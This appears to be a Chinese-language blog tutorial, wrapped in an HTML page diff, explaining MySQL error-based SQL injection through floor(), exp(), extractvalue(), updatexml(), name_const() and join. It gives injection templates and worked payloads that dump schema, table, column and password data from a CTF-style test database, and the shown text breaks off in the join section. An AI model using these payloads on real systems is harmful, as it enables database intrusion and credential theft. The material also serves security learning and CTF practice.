@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>详细解读mysql十二种报错注入 | Welcome to C1yas0's Blog</title>
+  <meta name="author" content="C1yas0" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="报错注入" />
+  
+  <meta name="description" content="使用条件查询不回显内容，会打印错误信息 报错原理报错型注入则是利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果 mysql语句的特性–子查询在这里虽然语句b有错误，但是由于语句a没">
+<meta property="og:type" content="article">
+<meta property="og:title" content="详细解读mysql十二种报错注入">
+<meta property="og:url" content="http://example.com/2020/10/01/%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%BBmysql%E5%8D%81%E4%BA%8C%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Welcome to C1yas0&#39;s Blog">
+<meta property="og:description" content="使用条件查询不回显内容，会打印错误信息 报错原理报错型注入则是利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果 mysql语句的特性–子查询在这里虽然语句b有错误，但是由于语句a没">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/10/01/%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%BBmysql%E5%8D%81%E4%BA%8C%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/https:/ae03.alicdn.com/kf/H6ebdf065ea3f45e98c482f3072034d5aj.png">
+<meta property="article:published_time" content="2020-10-01T16:15:00.000Z">
+<meta property="article:modified_time" content="2021-08-01T04:20:36.839Z">
+<meta property="article:author" content="C1yas0">
+<meta property="article:tag" content="报错注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/10/01/%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%BBmysql%E5%8D%81%E4%BA%8C%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/https:/ae03.alicdn.com/kf/H6ebdf065ea3f45e98c482f3072034d5aj.png">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/Ciyaso">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771?spm=1000.2115.3001.5343">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Welcome to C1yas0&#39;s Blog</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Welcome to C1yas0&#39;s Blog</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <div class="kratos-post-content">
+            <h2 class="title-h2 text-center">详细解读mysql十二种报错注入</h2>
+            <h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>查询不回显内容，会打印错误信息<br><img src="https://img-blog.csdnimg.cn/2021011812180974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h2><p>报错型注入则是利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果</p>
+<h2 id="mysql语句的特性–子查询"><a href="#mysql语句的特性–子查询" class="headerlink" title="mysql语句的特性–子查询"></a>mysql语句的特性–子查询</h2><p><img src="https://img-blog.csdnimg.cn/2021011812194754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在这里虽然语句b有错误，但是由于语句a没有错误所以成功查询出变量A,随后变量A与语句b构成新的语句，又由于语句b存在错误，所以报错时连带着变量A一起报错，从而实现了变量A的查询。</p>
+<h2 id="十二种报错注入"><a href="#十二种报错注入" class="headerlink" title="十二种报错注入"></a>十二种报错注入</h2><p><img src="https://img-blog.csdnimg.cn/20210118122533336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我将其根据报错原理分成五大类</p>
+<p>这里说明一下，在“操作代码”处将语句如下替换<br>查询MySQL版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version()</span><br></pre></td></tr></table></figure>
+
+<p>查询用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user()</span><br></pre></td></tr></table></figure>
+
+<p>暴库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata </span><br></pre></td></tr></table></figure>
+
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.`TABLES` WHERE table_schema = database()</span><br></pre></td></tr></table></figure>
+
+<p>爆列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name = &#x27;表名&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(列名) from 表名 </span><br></pre></td></tr></table></figure>
+
+<p>各个例题的数据库为<br>数据库名ctftest</p>
+<p>表名users</p>
+<p>列名<br>id   mane   password</p>
+<p>字段<br>1 a.name a.password<br>2 b.name b.password<br>3 c.name c.password<br>4 d.name d.password</p>
+<h1 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h1><h2 id="通过floor-报错注入"><a href="#通过floor-报错注入" class="headerlink" title="通过floor()报错注入"></a>通过floor()报错注入</h2><h3 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h3><p>floor() 函数，向下取整<br>rand() 函数，取随机数，若有参数x，则每个x对应一个固定的值，如果连续多次执行会变化，但是可以预测<br>floor( rand( 0 ) * 2 ) 产生的随机序列为011011…</p>
+<h3 id="报错原理-1"><a href="#报错原理-1" class="headerlink" title="报错原理"></a>报错原理</h3><p>利用数据库表主键不能重复的原理，使用 <code>GROUP BY</code> 分组，产生主键key冗余，导致报错<br>已知表users如下</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>NAME</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>AA</td>
+</tr>
+<tr>
+<td>2</td>
+<td>AA</td>
+</tr>
+<tr>
+<td>3</td>
+<td>BB</td>
+</tr>
+</tbody></table>
+<p><code>sql</code>语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) ,name <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> name; </span><br></pre></td></tr></table></figure>
+
+<p>在进行分组运算的时候会根据name属性，创建一个虚拟表</p>
+<p>从上至下扫描，当扫描到第一行NAME === AA 的时候</p>
+<p>当前虚拟表没有该字段，那么插入此虚拟表，count = 1</p>
+<table>
+<thead>
+<tr>
+<th>count</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>AA</td>
+</tr>
+</tbody></table>
+<p>当扫描到第二行 NAME === AA 的时候</p>
+<p>当前虚拟表存在该字段，那么count + 1</p>
+<table>
+<thead>
+<tr>
+<th>count</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>AA</td>
+</tr>
+</tbody></table>
+<p>当扫描到第三行 NAME === BB 的时候</p>
+<p>当前虚拟表不存在该字段，执行插入，count = 1</p>
+<table>
+<thead>
+<tr>
+<th>count</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>AA</td>
+</tr>
+<tr>
+<td>1</td>
+<td>BB</td>
+</tr>
+</tbody></table>
+<p>那么利用floor( rand( 0 ) * 2) 这个函数的返回值，进行分组，因为序列为011011…</p>
+<p>那么构建SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>),<span class="built_in">floor</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">as</span> x <span class="keyword">from</span> users <span class="keyword">GROUP</span> <span class="keyword">BY</span> x;</span><br></pre></td></tr></table></figure>
+
+<p>查询第一条记录，别名x 产生 键值<code>0</code>，当键值 <code>0</code> 不存在虚拟表时，执行插入,此时别名x是一个函数，是变量，在执行插入时，按照<code>GROUP BY</code>分组之时 又要执行floor函数，得到1 ，故向虚拟表中插入键值1，count = 1</p>
+<table>
+<thead>
+<tr>
+<th>COUNT</th>
+<th>x</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>查询第二条记录，别名x产生键值1，虚拟表中存在1，则令count + 1 = 2</p>
+<table>
+<thead>
+<tr>
+<th>COUNT</th>
+<th>x</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>查询第三条记录，别名x产生键值0，键值0不存在临时表，执行插入，别名x再次执行得键值1，由于1存在于临时表，那么插入之后如下表所示</p>
+<table>
+<thead>
+<tr>
+<th>COUNT</th>
+<th>x</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>1</td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>由于数据库主键唯一性，现在临时表中存在两个键值为1，主键冗余，所以报错</p>
+<p>由于数据库报错会将报错原因展示出来，故利用报错来实现注入</p>
+<blockquote>
+<p>由上知，要保证floor报错注入，那么必须保证查询的表必须大于三条数据</p>
+</blockquote>
+<h3 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h3><p>输出字符长度限制为64个字符</p>
+<h3 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select * from (select count(*),concat(0x7e,(操作代码),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y)</span><br></pre></td></tr></table></figure>
+
+<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,</span><br><span class="line">(select schema_name from information_schema.schemata limit 1,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118120444977.png" alt="在这里插入图片描述"></p>
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,(select table_name </span><br><span class="line">from information_schema.`TABLES` WHERE table_schema = database() limit 0,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118120619261.png" alt="在这里插入图片描述"></p>
+<p>爆列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,(select column_name</span><br><span class="line">from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118120803202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,(select column_name</span><br><span class="line">from information_schema.columns where table_name = &#x27;users&#x27; limit 1,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118120836400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,(select column_name</span><br><span class="line">from information_schema.columns where table_name = &#x27;users&#x27; limit 2,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118120855747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,(select password from users limit 0,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118121135241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,(select password from users limit 1,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118121147679.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,(select password from users limit 2,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118121235258.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (select * from (select count(*),concat(0x7e,(select password from users limit 3,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2021011812120681.png" alt="在这里插入图片描述"></p>
+<h2 id="通过exp-报错注入"><a href="#通过exp-报错注入" class="headerlink" title="通过exp()报错注入"></a>通过exp()报错注入</h2><h3 id="函数解释-1"><a href="#函数解释-1" class="headerlink" title="函数解释"></a>函数解释</h3><p>exp()数学函数，用于计算e的x次方的函数。</p>
+<h3 id="约束条件-1"><a href="#约束条件-1" class="headerlink" title="约束条件"></a>约束条件</h3><p>5.5&lt;mysql版本&lt;5.6</p>
+<h3 id="报错原理-2"><a href="#报错原理-2" class="headerlink" title="报错原理"></a>报错原理</h3><p>exp是以e为底的指数函数，<br><img src="https://img-blog.csdnimg.cn/20210116235335980.png" alt="在这里插入图片描述"></p>
+<p>但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。<br><img src="https://img-blog.csdnimg.cn/20210116235354474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70"></p>
+<p>将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。<br><img src="https://img-blog.csdnimg.cn/20210116235447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。<br><img src="https://img-blog.csdnimg.cn/20210116235512639.png" alt="在这里插入图片描述"><br>从而实现了报错注入。</p>
+<h3 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (exp(~(select * from (操作代码) a)))</span><br></pre></td></tr></table></figure>
+
+<h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><p><img src="https://img-blog.csdnimg.cn/20210116234512834.png" alt="在这里插入图片描述"></p>
+<h2 id="通过ExtractValue-报错注入"><a href="#通过ExtractValue-报错注入" class="headerlink" title="通过ExtractValue()报错注入"></a>通过ExtractValue()报错注入</h2><h3 id="函数解释："><a href="#函数解释：" class="headerlink" title="函数解释："></a>函数解释：</h3><p>　　extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称<br>　　第二个参数：XPath_string (Xpath格式的字符串)<br>　　concat:返回结果为连接参数产生的字符串。</p>
+<h3 id="报错原理-3"><a href="#报错原理-3" class="headerlink" title="报错原理"></a>报错原理</h3><p>例如：<code>SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;);</code> 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c9cc5bcdd227601518c5ad3cb9fd6aa5.png" alt="1551927935215"></p>
+<h3 id="约束条件-2"><a href="#约束条件-2" class="headerlink" title="约束条件"></a>约束条件</h3><p> 输出字符长度限制为32个字符</p>
+<h3 id="注入语句-2"><a href="#注入语句-2" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(null,concat(0x7e,(代码操作),0x7e))</span><br></pre></td></tr></table></figure>
+
+<h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id and extractvalue(null,concat(0x7e,(select version()),0x7e));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2021011811264663.png" alt="在这里插入图片描述"></p>
+<h2 id="通过UpdateXml-报错注入"><a href="#通过UpdateXml-报错注入" class="headerlink" title="通过UpdateXml()报错注入"></a>通过UpdateXml()报错注入</h2><h3 id="函数解释：-1"><a href="#函数解释：-1" class="headerlink" title="函数解释："></a>函数解释：</h3><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <em>xml_target</em> 新的XML片段 <em>new_xml</em> ，然后返回更       改的XML。<em>xml_target</em>替换的部分 与<em>xpath_expr</em> 用户提供的XPath表达式匹配。如果未<em>xpath_expr</em>找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 <em>xml_target</em>XML片段。</p>
+<h3 id="报错原理-4"><a href="#报错原理-4" class="headerlink" title="报错原理"></a>报错原理</h3><p>这里和extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容。</p>
+<h3 id="约束条件-3"><a href="#约束条件-3" class="headerlink" title="约束条件"></a>约束条件</h3><p> 输出字符长度限制为32个字符</p>
+<h3 id="注入语句-3"><a href="#注入语句-3" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(代码操作),0x7e),3)</span><br></pre></td></tr></table></figure>
+
+<h3 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h3><p>构造注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from user where id=1 and updatexml(1,concat(0x7e,(select version()),0x7e),3);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118112854585.png" alt="在这里插入图片描述"><br>发现注入成功，成功爆出版本号。</p>
+<h2 id="通过NAME-CONST-报错注入"><a href="#通过NAME-CONST-报错注入" class="headerlink" title="通过NAME_CONST()报错注入"></a>通过NAME_CONST()报错注入</h2><h3 id="函数解释-2"><a href="#函数解释-2" class="headerlink" title="函数解释"></a>函数解释</h3><p>NAME_CONST(name,value）</p>
+<p>Returns the given value. When used to produce a result set column, <a target="_blank" rel="noopener" href="http://dev.mysql.com/doc/refman/5.1/en/miscellaneous-functions.html#function_name-const"><code>NAME_CONST()</code></a> causes the column to have the given name. The arguments should be constants.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT NAME_CONST(&#x27;myname&#x27;, 14);</span><br><span class="line">+--------+</span><br><span class="line">| myname |</span><br><span class="line">+--------+</span><br><span class="line">|     14 |</span><br><span class="line">+--------+ </span><br></pre></td></tr></table></figure>
+
+<p>This function is for internal use only. The server uses it when writing statements from stored programs that contain references to local program variables, as described in [Section 19.6, “Binary Logging of Stored Programs”], You might see this function in the output from mysqlbinlog. </p>
+<h3 id="报错原理-5"><a href="#报错原理-5" class="headerlink" title="报错原理"></a>报错原理</h3><p>mysql列名重复会导致报错,通过name_const制造一个列</p>
+<p>我们可以利用mysql列名重复会导致报错这个原理配合join函数得到列名using 等价 join 中的On</p>
+<h3 id="约束条件-4"><a href="#约束条件-4" class="headerlink" title="约束条件"></a>约束条件</h3><p>查询的内容需是定值(约束条件过于苛刻，可操作的内容极其少)</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118113132203.png" alt="在这里插入图片描述"></p>
+<h3 id="注入语句-4"><a href="#注入语句-4" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from (select * from(select name_const(操作代码,0)) a join (select name_const(操作代码,0)) b)c)</span><br></pre></td></tr></table></figure>
+
+<h3 id="举例-4"><a href="#举例-4" class="headerlink" title="举例"></a>举例</h3><p><img src="https://img-blog.csdnimg.cn/20210118113206306.png" alt="在这里插入图片描述"></p>
+<h2 id="通过join报错注入"><a href="#通过join报错注入" class="headerlink" title="通过join报错注入"></a>通过join报错注入</h2><h3 id="函数解释-3"><a href="#函数解释-3" class="headerlink" title="函数解释"></a>函数解释</h3><p><img src="https://img-blog.csdnimg.cn/2021011811503850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210118115059474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="约束条件-5"><a href="#约束条件-5" class="headerlink" title="约束条件"></a>约束条件</h3><p>在知到表名的前提下才能操作</p>
+<h3 id="注入语句-5"><a href="#注入语句-5" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and（select * from (select * from 表名 a join 表名 b using(已知的字段1，已知的字段2,……)c)）</span><br></pre></td></tr></table></figure>
+
